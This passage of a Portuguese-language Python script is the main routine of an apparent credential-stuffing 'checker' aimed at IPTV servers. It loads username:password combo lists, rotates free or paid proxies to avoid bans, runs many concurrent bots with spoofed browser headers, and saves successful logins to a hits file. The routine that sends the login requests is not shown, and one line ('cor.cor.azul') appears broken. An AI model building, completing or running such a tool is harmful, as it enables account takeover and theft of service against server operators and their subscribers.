    banner(config, t)
    print("\n  {}{}{}".format(cor.ciano, "=" * 26, cor.reset))
    print("  {}{}{}".format(cor.atention, t("questions.server_host"), cor.reset))
    print("  {}{}{}  \n".format(cor.ciano, "=" * 26, cor.reset))
    server = input("\n  {}{} >>> {}".format(
        cor.verde,
        t('responses.response'),
        cor.reset
    )).strip()
    server = limpar_host(server)
    if not server:
        print("{}\n  {}{}".format(cor.vermelho, t("responses.invalid_host"), cor.reset))
        return

    banner(config, t)

    sistema_operacional = config["sistema_operacional"]
    caminho_base = determinar_caminho_base(sistema_operacional)
    
    if not caminho_base:
        print("{}  {}{}".format(cor.vermelho, t('responses.system_not_suported'), cor.reset))
        return

    pasta_combo = os.path.join(caminho_base, "Combo")
    pasta_proxy = os.path.join(caminho_base, "Proxy")
    pasta_hits = os.path.join(caminho_base, "Hits")

    for pasta in [pasta_combo, pasta_proxy, pasta_hits]:
        if not os.path.exists(pasta):
            print("{}  {} {}{}".format(cor.amarelo, t('responses.creating_folder_combo'), pasta, cor.reset))
            os.makedirs(pasta)

    combos = []
    arquivo_combo = None

    while True:
        resultado_combo = escolher_arquivo(pasta_combo, t, tipo="combo", config=config)

        if not resultado_combo:
            print("{}Nenhum combo selecionado. Encerrando...{}".format(cor.vermelho, cor.reset))
            return

        if isinstance(resultado_combo, list):
            combos = resultado_combo
            arquivo_combo = "ONLINE COMBO API'S"
            print("{}{} combos carregados da API online.{}".format(cor.verde, len(combos), cor.reset))
            break
        else:
            arquivo_combo = resultado_combo
            print("{}Carregando combos do arquivo local: {}{}".format(cor.ciano, os.path.basename(arquivo_combo), cor.reset))
            try:
                linhas_invalidas = 0
                with open(arquivo_combo, 'r', encoding='utf-8') as f:
                    for linha in f.readlines():
                        linha = linha.strip()
                        if ":" in linha and len(linha.split(":")) == 2:
                            username, password = linha.split(":", 1)
                            combos.append((username, password))
                        else:
                            linhas_invalidas += 1

                if linhas_invalidas > 0:
                    print("{}{} linhas inválidas foram removidas do combo.{}".format(cor.amarelo, linhas_invalidas, cor.reset))
                
                if combos:
                    break
                else:
                    print("{}Nenhum combo válido encontrado no arquivo local. Tente novamente.{}".format(cor.vermelho, cor.reset))

            except FileNotFoundError:
                print("{}Erro: O arquivo de combo '{}' não foi encontrado. Tente novamente.{}".format(cor.vermelho, arquivo_combo, cor.reset))
            except Exception as e:
                print("{}Erro ao ler o arquivo de combo: {}. Tente novamente.{}".format(cor.vermelho, e, cor.reset))

    banner(config, t)
    print("\n  {}{}{}".format(cor.ciano, "=" * 26, cor.reset))
    print("  {}{}{}".format(cor.atention, t("questions.confirm_proxy"), cor.reset))
    print("  {}[1] {}\n  [2] {}".format(cor.azul, t("questions.yes"), t("questions.no")))
    print("  {}{}{}\n".format(cor.ciano, "=" * 26, cor.reset))
    usar_proxy = input("\n  {}{} >>> {}".format(
        cor.verde,
        t('responses.response'),
        cor.reset
    )).strip()
    if usar_proxy not in ["1", "2"]:
        print("\n  {}{}{}".format(cor.vermelho, t("questions.error_question_proxy"), cor.reset))
        return

    if usar_proxy == "1":
        banner(config, t)
        print("\n{}Deseja usar proxy paga ou grátis?{}".format(cor.ciano, cor.reset))
        print("{}[1] Proxy Grátis (sem usuário/senha){}".format(cor.azul, cor.reset))
        print("{}[2] Proxy Paga (com usuário/senha){}".format(cor.azul, cor.reset))
        tipo_acesso_proxy = input("{}  {} >>> {}".format(
            cor.verde,
            t('responses.response'),
            cor.reset
        )).strip()

        formato_paga = None

        if tipo_acesso_proxy == "1":

            banner(config, t)

            retorno_proxy = escolher_arquivo(pasta_proxy, t, tipo="proxy", config=config)

            if isinstance(retorno_proxy, tuple):

                proxies, tipo_proxy = retorno_proxy
                arquivo_proxy = "ONLINE_API"
            elif retorno_proxy:

                arquivo_proxy = retorno_proxy
                try:
                    with open(arquivo_proxy, 'r') as f:
                        proxies = [linha.strip() for linha in f if linha.strip()]
                    
                    banner(config, t)
                    print("\n{}  Escolha o tipo da Proxy:{}".format(cor.atention, cor.reset))
                    print("{}  [1] HTTP/HTTPS\n  [2] SOCKS4\n  [3] SOCKS5{}".format(cor.azul, cor.reset))
                    tipo_proxy = int(input("{}  {} >>> {}".format(
                        cor.verde,
                        t('responses.response'),
                        cor.reset
                    )))
                except FileNotFoundError:
                    print("{}Arquivo de proxy não encontrado!{}".format(cor.vermelho, cor.reset))
                    return
                except (ValueError, TypeError):
                    print("{}Tipo de proxy inválido!{}".format(cor.vermelho, cor.reset))
                    return
            else:

                print("{}Nenhuma fonte de proxy selecionada.{}".format(cor.vermelho, cor.reset))
                return

        elif tipo_acesso_proxy == "2":
            banner(config, t)
            print("\n{}Deseja digitar os dados da proxy paga ou carregar de um .txt?{}".format(cor.ciano, cor.reset))
            print("{}[1] Digitar manualmente\n[2] Carregar de um arquivo{}".format(cor.azul, cor.reset))
            escolha_proxy_paga = input("{}  {} >>> {}".format(
                cor.verde,
                t('responses.response'),
                cor.reset
            )).strip()

            if escolha_proxy_paga == "1":
                host = input("{}Host (ex: rp.scrapegw.com){}\n{}>>>{}".format(
                    cor.ciano,
                    cor.reset,
                    cor.verde,
                    cor.reset
                ))
                port = input("{}Porta (ex: 6060){}\n{}  {} >>> {}".format(
                    cor.ciano,
                    cor.reset,
                    cor.verde,
                    t('responses.response'),
                    cor.reset
                )).strip()
                user = input("{}Usuário:{}\n{}  {} >>> {}".format(
                    cor.ciano,
                    cor.reset,
                    cor.verde,
                    t('responses.response'),
                    cor.reset
                )).strip()
                senha = input("{}Senha:{}\n{}  {} >>> {}".format(
                    cor.ciano,
                    cor.reset,
                    cor.verde,
                    t('responses.response'),
                    cor.reset
                )).strip()

                proxies = [f"{host}:{port}:{user}:{senha}"]
                arquivo_proxy = "PROXY MANUAL PAID"
            elif escolha_proxy_paga == "2":
                arquivo_proxy = escolher_arquivo(pasta_proxy, t, tipo="proxy")
                if not arquivo_proxy:
                    return
                with open(arquivo_proxy, 'r') as f:
                    proxies = [linha.strip() for linha in f if linha.strip()]
                arquivo_proxy = os.path.basename(arquivo_proxy)
            else:
                print("{}Opção inválida!{}".format(cor.vermelho, cor.reset))
                return

            print("\n{}Qual é o formato da proxy paga?{}".format(cor.ciano, cor.reset))
            print("{}[1] hostname:port:username:password".format(cor.cor.azul))
            print("[2] username:password@hostname:port")
            print("[3] http://username:password@hostname:port{}".format(cor.reset))
            formato_paga = input("{}  {} >>> {}".format(
                cor.verde,
                t('responses.response'),
                cor.reset
            )).strip()

            print("\n{}Qual protocolo deseja usar?{}".format(cor.ciano, cor.reset))
            print("{}[1] HTTP/HTTPS\n[2] SOCKS5{}".format(cor.azul, cor.reset))
            protocolo_input = input("{}  {} >>> {}".format(
                cor.verde,
                t('responses.response'),
                cor.reset
            )).strip()

            if protocolo_input == "1":
                tipo_proxy = 1
            elif protocolo_input == "2":
                tipo_proxy = 3
            else:
                print("{}Protocolo inválido!{}".format(cor.vermelho, cor.reset))
                return

        else:
            print("{}Opção inválida!{}".format(cor.vermelho, cor.reset))
            return

    banner(config, t)
    escolha_categoria = selecionar_busca_categorias(t)

    try:
        banner(config, t)
        print("\n  {}{}{}".format(cor.ciano, "=" * 26, cor.reset))
        print("{}  {}{}".format(cor.atention, t("questions.number_of_bots"), cor.reset))
        print("  {}{}{}\n".format(cor.ciano, "=" * 26, cor.reset))
        num_bots = int(input("\n  {}{} >>> {}".format(
            cor.verde,
            t('responses.response'),
            cor.reset
        )).strip()
        if num_bots < 1:
            print("{}{}{}".format(cor.vermelho, t("responses.invalid_number_of_bots"), cor.reset))
            return
    except ValueError:
        print("{}{}{}".format(cor.vermelho, t("responses.invalid_input_number"), cor.reset))
        return

    headers = {
        "Host": server,
        "Referer": f"http://{server}/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    }

    nome_arquivo = f"ChK IPTV [ {server.replace(':', '_')} ].txt"
    caminho_arquivo = os.path.join(pasta_hits, nome_arquivo)

    hits = 0
    bads = 0
    bans = 0
    total_linhas = len(combos)

    hits, bads, bans = processar_combos(
        combos, server, headers, proxies, tipo_proxy, num_bots, hits, bads, bans,
        total_linhas, caminho_arquivo, usar_proxy,
        arquivo_proxy if usar_proxy == "1" else None, config, t,
        escolha_categoria, formato_paga if usar_proxy == "1" and tipo_acesso_proxy == "2" else None
    )

    print("\n{}{}{}".format(cor.magenta, t("menu.exit_message_1"), cor.reset))

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print("\n{}  CRITICAL ERROR: {}{}".format(cor.vermelho, e, cor.reset))
        traceback.print_exc()
        input("Pressione Enter para sair...")